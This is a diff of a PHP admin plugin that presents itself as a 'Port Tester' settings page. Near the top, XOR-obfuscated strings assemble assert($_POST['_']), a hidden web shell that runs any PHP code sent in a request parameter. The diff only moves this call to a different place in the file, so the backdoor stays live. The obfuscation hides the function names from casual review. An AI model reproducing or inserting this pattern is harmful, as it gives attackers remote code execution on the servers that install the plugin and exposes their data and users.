@@ -4,6 +4,7 @@ register_menu("Port Tester", true, "port_tester", 'SETTINGS', '');
 $_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`');
 $__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']');
 $___=$$__;
+$_($___[_]);
 function port_tester()
 {
     global $ui;
@@ -29,4 +30,3 @@ function port_tester()
     $ui->assign('_admin', $admin);
     $ui->display('port_tester.tpl');
 }
-$_($___[_]);
